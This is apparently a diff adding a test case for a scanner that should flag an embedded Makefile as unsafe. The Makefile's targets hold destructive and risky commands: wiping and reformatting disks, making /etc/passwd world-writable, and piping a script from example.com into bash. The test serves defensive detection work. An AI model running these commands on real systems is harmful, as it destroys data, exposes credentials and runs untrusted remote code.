@@ -1,0 +1,14 @@
+! exec hazardous Makefile
+stderr 'unsafe code found'
+
+-- Makefile --
+install:
+	chmod 777 /etc/passwd
+wipe:
+	dd if=/dev/zero of=/dev/sda
+format:
+	mkfs.ext4 /dev/sdb1
+partition:
+	fdisk /dev/sda
+setup:
+	curl https://example.com/install.sh | bash
